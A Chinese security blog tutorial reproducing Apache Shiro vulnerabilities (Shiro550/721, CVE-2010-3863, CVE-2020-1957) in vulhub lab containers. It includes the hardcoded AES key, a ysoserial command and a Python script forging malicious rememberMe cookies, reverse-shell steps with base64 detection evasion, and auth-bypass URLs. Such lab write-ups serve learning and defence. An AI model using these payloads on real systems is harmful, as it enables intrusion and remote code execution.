#  Shiro框架漏洞看了你就会了（含靶场复现）   
工作室-Lin  马哥网络安全   2024-12-12 09:01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAliaic0KIAYzx92YgY0Kbic1ByRdVrsvCicRzOUia0LOEP6Hc86gTVoSmWL3jMtEwpTqZoZV0DLABGSOLw/640?wx_fmt=png&from=appmsg "")  
# 一、shiro简介  
- Shiro是一个功能强大且易于使用的Java安全框架，旨在简化Java应用程序的安全开发。  
  
- 它提供了身份认证（登录）、授权（访问控制）、加密、会话管理以及与Web集成的功能，可以应用于从小型移动应用到大型Web和企业应用的多种场景。  
  
- Shiro既可以独立运行，也可以与其他框架（如Spring）无缝集成。  
  
# 二、shiro550  
## 概念  
- Shiro 550漏洞，也被称为CVE-2016-4437，是一个与Apache Shiro框架中的“RememberMe  
”功能相关的反序列化漏洞。  
  
- 当用户勾选“RememberMe  
”选项并成功登录时，Shiro会在Cookie中存储加密后的用户信息。如果攻击者能够获取到加密密钥，就可以替换Cookie中的用户信息为恶意代码，从而在服务端解密时触发反序列化漏洞，执行任意代码。  
  
## 漏洞原理  
- 加密过程：用户信息首先被序列化，然后使用AES算法加密（使用固定的或可预测的密钥），接着进行base64编码，最后作为RememberMe Cookie的值发送给客户端。  
  
- 问题所在：在Shiro <= 1.2.24  
版本中，使用了固定的AES加密密钥（如：kPH+bIxk5D2deZiIxcaaaA==  
），攻击者有可能通过爆破或已知密钥的方式获取加密密钥。  
  
- 解密与反序列化：当用户再次访问网站时，服务端会读取Cookie中的RememberMe值，进行base64解码、AES解密和反序列化。如果攻击者已经替换了Cookie中的值为恶意代码，那么在反序列化过程中就会执行恶意代码  
  
**今日阅读福利：《黑客攻防技术宝典》**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlMVzgUr2yjjP9QH56KVwNEJTxOCmMJ5hiaPvxSenBMicKrtmibFVcZG9d3j2AAia1pGfKB22VevoRF2A/640?wx_fmt=png&from=appmsg "")  
  
扫码备注**“黑客攻防技术宝典”**，即可100%免费领取  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlysrbzcCIib4v2X1CYmWSmqMRksricLDELianZ2FIeNqgiak6gcAuvnI9z04QiafMnMFzA9MeMHBKm88A/640?wx_fmt=png&from=appmsg "")  
# 三、shiro721  
## 概念  
- Shiro 721漏洞指的是与Apache Shiro框架中AES-128-CBC  
加密模式相关的侧信道攻击（如Padding Oracle Attack）漏洞。  
  
- 这种攻击允许攻击者通过构造的密文来推断出原始明文的一部分或全部信息。  
  
## 漏洞原理  
- CBC模式：Apache Shiro在“RememberMe  
”功能中使用了AES-128-CBC  
加密模式。CBC模式是一种分组密码的工作模式，它使用前一个密文块作为当前明文块的加密密钥的一部分。  
  
- Padding Oracle Attack：攻击者通过向服务端发送构造的密文块，观察服务端的响应（如是否返回了Padding错误），来推断出密文块中的某些信息。通过多次迭代和猜测，攻击者可以逐步解密出整个密文。  
  
- 漏洞利用：攻击者如果成功解密出RememberMe Cookie中的加密信息，就可以替换为恶意代码，并在服务端解密时触发反序列化漏洞，执行任意代码。  
  
# 四、shiro组件特征  
- 在登录时抓包，如果响应头的set-cookie  
字段中显示rememberMe=deleteMe  
， 说明使用了shiro组件    
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5jGciciavuPatm9jrn8vyYDMibP6giaXBMibwCjZcB6ewtVuuVatwwwthrVQ/640?wx_fmt=png&from=appmsg "")  
  
# 一、漏洞概述  
- CVE-2010-3863是Apache Shiro框架中存在的一个安全漏洞，它允许攻击者通过构造特定的URI请求来绕过身份验证和授权机制，从而访问受限的资源。  
  
- 这个漏洞主要影响Apache Shiro 1.1.0之前的版本以及JSecurity 0.9.x版本。  
  
# 二、漏洞原理  
- Apache Shiro在进行权限验证前，没有对URI路径进行标准化处理。  
  
- 在Web应用程序中，URI路径可能包含多种特殊字符和路径遍历序列（如：/  
、//  
、/./  
、/../  
等），这些序列在大多数情况下应该被标准化或解析为等效的简化路径。  
  
- 在Apache Shiro的受影响版本中，这些特殊字符和序列被直接用于与配置文件中的URI模式进行匹配，从而允许攻击者通过构造特定的URI来绕过权限验证。  
  
# 三、漏洞复现  
- 进入/root/vulhub-master/shiro/CVE-2010-3863  
目录，输入以下命令  
  
```
docker-compose build
docker-compose up -d
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5m007RxZuv1AcsZatUVXojuicPLXBlC1n032p54iathcLkUxyXrWfau9g/640?wx_fmt=png&from=appmsg "")  
- 然后在火狐浏览器访问：http://192.168.1.4:8080/  
  
- 192.168.1.4为靶机IP  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5GlJMcHYDw55UTfJDgUqZ9pKoOM3pfAssX2huiaqAO49iaSngw8Ex8IiaA/640?wx_fmt=png&from=appmsg "")  
- 此时，直接请求http://192.168.1.4:8080/admin  
这个路径会无法访问，使用Burp抓包，会发现被重定向到登录页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5dtaFohuuouy65W4q49iau00qSF1xCIwhjMKsf17V6TJk9q84OBOB8Ew/640?wx_fmt=png&from=appmsg "")  
- 此时，我们可以构造恶意请求/./admin  
，发现可以绕过权限校验，访问到管理页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc53A8YvuRR3wXiaPA5KbjG2HAwPklqG9Mxpg3tOBG8R6TBOabmibK4aAzw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc55ZOTLktibbtvTiculNMkwL1BzK9rZ75AfMSUJmLmplcFOd7OzIoTOANg/640?wx_fmt=png&from=appmsg "")  
  
# 一、漏洞概述  
- CVE-2016-4437漏洞主要影响Apache Shiro的“rememberMe”功能，该功能允许用户在关闭浏览器后仍然保持会话。  
  
- 当该功能被启用时，Shiro会将用户的会话信息序列化并存储在一个cookie中，以便在用户重新访问时恢复会话。  
  
- 该漏洞允许攻击者通过修改“rememberMe”cookie，注入特制的恶意Java序列化对象，从而在目标系统上执行任意代码（攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令）。  
  
# 二、漏洞原理  
- 漏洞的核心在于Shiro对加密的“rememberMe”cookie的处理不当。  
  
- 具体来说，Apache Shiro在版本1.2.4及之前版本中，默认使用了一个硬编码的AES密钥（如：kPH+bIxk5D2deZiIxcaaaA==  
）来加密存储在“rememberMe”cookie中的序列化用户信息。  
  
- 由于密钥是硬编码的且公开，攻击者可以轻易地构造恶意代码，将其序列化后使用相同的密钥进行AES加密和Base64编码，最终将这个恶意的cookie值发送给目标系统。当Shiro接收到这个恶意的cookie并尝试反序列化其中的内容时，就会触发反序列化漏洞，允许攻击者执行任意代码。  
  
# 三、漏洞复现  
- 进入/root/vulhub-master/shiro/CVE-2010-3863  
目录，输入以下命令  
  
```
docker-compose build
docker-compose up -d
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5SjLuicjiayb036CfkVypicHcibR5HWfib0x9yOdzTUia3icRv9UtxfhUBA0tw/640?wx_fmt=png&from=appmsg "")  
- 然后在火狐浏览器访问：http://192.168.1.4:8080/  
  
- 192.168.1.4为靶机IP  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5kmoFeZ3Hxk1c8uSkPlP2wgvda4NAgE9lcevLwgLQFiazxsFszRicfHqw/640?wx_fmt=png&from=appmsg "")  
- 输入任意账号密码，使用Burp抓包，在返回包中发现set_cookie  
存在rememberMe=deleteMe  
特征  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5icDaEqePovhkVTbKB9R6u75iafeuiaiciaHr2XmvicQ2ORyZibQwTIlGnRHcA/640?wx_fmt=png&from=appmsg "")  
## 手工利用  
- 下载反序列化利用工具“ysoserial”  
  
- 工具下载地址：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar  
  
- 使用ysoserial生成CommonsBeanutils1的Gadget（利用Apache Commons BeanUtils库构造的恶意代码片段或序列化对象。）  
  
```
java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/succ123" > poc.ser
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5QicGia93Y8zqmk6onpm1a4jXwMSr4MX36u8QdsIm1ELYiaBRf82TiceQmg/640?wx_fmt=png&from=appmsg "")  
- 接着使用poc脚本生成payload  
  
```
import sys
import uuid
import base64
from Crypto.Cipher import AES

def encode_rememberme():
    f = open('poc.ser','rb')
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(f.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme()   
    print("rememberMe={0}".format(payload.decode()))
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc51AibKxMmPflb75ZR2icLTdibvgaDLEYf4bhGoMZdRPrZCvKWWibGHOJiaIg/640?wx_fmt=png&from=appmsg "")  
- 此时将生成的Payload替换到Burp抓到的请求包的cookie中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc58J2kGS4iaHkl8Qr0TmQUATSMialpXRt3enQvsa17FoR3dKpVO4YA0Yrg/640?wx_fmt=png&from=appmsg "")  
- 进入搭建靶机，查看生成文件  
  
```
docker ps
docker exec -it f2a7445001c5 /bin/bash
cd /tmp
ls
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5CPJOKL4UPdBZhbjMU4937uzUYCEZxtLt0WU4r7jMJGxSHMmEtf04dw/640?wx_fmt=png&from=appmsg "")  
## 工具利用（ONE-FOX集成工具箱的shiro综合利用工具）  
- 爆破key  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5rXMCmmicmIveFEibaRbB0vRofrObiaEWa2Z1lqJNA95kKjGHCTTeCeicTg/640?wx_fmt=png&from=appmsg "")  
- 爆破利用链及回显  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5OqMxX9rKApgno789CBngngdHh60rkbhYBWz0kPNe0lT4h2bnq8V67g/640?wx_fmt=png&from=appmsg "")  
- 命令执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5pumpsRRQyxAfr1Ld0Cx4VOSfZ467WtoqiakJsFp66EicOytsfqTRho7A/640?wx_fmt=png&from=appmsg "")  
## 使用py脚本进行反弹shell  
- 脚本下载地址：https://github.com/insightglacier/Shiro_exploit  
  
- 反弹shell的语句需要base64编码绕过检测机制  
  
- 编码平台地址：https://ares-x.com/tools/runtime-exec  
  
-   
-   
-   
-   
-   
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5jx8ZaxpVgmOIe0icu2icVbZ08pTrze2Nxj0B4VXoKzp1R5Sy2RnnpSOQ/640?wx_fmt=png&from=appmsg "")  
- 此时在恶意主机上监听6666端口  
  
```
nc -lnvp 6666
```  
- 接着使用脚本对靶机进行攻击，此时反弹shell成功  
  
- 注意，该脚本需要ysoserial.jar工具放在同一个目录下  
  
-   
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5qqj5SPBnQsZE98CegWqEB5S4ElwcyrOiaNCx72SicuczvbB95FY83lEw/640?wx_fmt=png&from=appmsg "")  
  
  
# 一、漏洞概述  
- 影响范围：Apache Shiro 1.5.1之前的版本  
  
- 漏洞类型：认证绕过  
  
- 漏洞描述：在Spring Boot中使用Apache Shiro进行身份验证和权限控制时，由于Shiro和Spring对URL处理的差异化，攻击者可以可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，构造恶意URL绕过Shiro的权限控制，实现未授权访问。  
  
# 二、漏洞原理  
- Shiro通过拦截器功能来控制用户访问权限，如anon  
（匿名拦截器，不需要登录即可访问）和authc  
（登录拦截器，需要登录才能访问）等。  
  
- Shiro的URL路径表达式采用Ant格式，路径通配符*  
表示匹配零个或多个字符串。  
  
- 然而，在处理URL时，Shiro和Spring之间存在差异，在Shiro中，/resource/xx  
与/resource/xx/  
被视为两个不同路径，而在Spring中，这两个URL都会被解析为相同的资源。  
  
- 因此，攻击者可以通过在URL末尾添加斜杠（/  
）或利用特定的URL编码技巧（如..;/  
），绕过Shiro的权限控制。  
  
# 三、漏洞复现  
- 进入/root/vulhub-master/shiro/CVE-2020-1957  
目录，输入以下命令  
  
```
docker-compose build
docker-compose up -d
```  
- 然后在火狐浏览器访问：http://192.168.1.4:8080/  
  
- 192.168.1.4为靶机IP  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5aMZiaB5eOxcAN7WdhIZuGxN3djvRQkpoRIl4X6gjQ8vichKgia6gI7wiaQ/640?wx_fmt=png&from=appmsg "")  
- 此时我们直接请求管理页面/admin/  
，发现无法访问，而是会被302重定向到登录页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5vgdLicdz4W2Qm1em6J32Gcdt25MQNT4GeBhr83te6MokIverohG000w/640?wx_fmt=png&from=appmsg "")  
- 接着我们构造恶意请求/xxx/..;/admin/  
，发现绕过了权限校验，未授权访问到了管理页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5XfAka5QdW40FNgJyodWibH7Z7nekOUCGicOg0UicVPx0iaahox4iay1nTGQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8OLrfyDFguGjRb01GrH058tOp3df0bc5J1wpZ1vCJARchJ6BwLVdblia3WtGy1gP2cqluESnIBicJOUF4N4YsnkQ/640?wx_fmt=png&from=appmsg "")  
  
内容转自广软腾科IT视界，如有侵权请联系删除  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/iaIicfo73Ma1vawibO9wLYILrhQIfwChvgOImKZkuNWI8GOooRxib2zV6HqibN8GUXECib6tPedP736qeiblicT5gTbstA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
今夜狂欢  
  
今晚19:30直播上强干货  
  
揭秘【IT人2025成长路径逆袭进阶】  
  
直播过程抽奖不断，助力新的一年升职加薪  
  
并且还有大汉疆域GPS无人机、外星人畅玩黑神话鼠标  
  
Redmi电脑音箱、实体书籍现场抽奖  
  
扫码免费预约直播↓  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkibSLtx2MRia79mst2UzCvnzKria9oBcehVeC9xF1dSq5A5I8DzHtUR06xmNRqTX1ic1bqodSyr9jMvA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UkV8WB2qYAlMVzgUr2yjjP9QH56KVwNEHfMw8oFa3nOJGxprela8RVo8SBdo7I6TkBn39W7w6Aiabqfex4yqHxQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
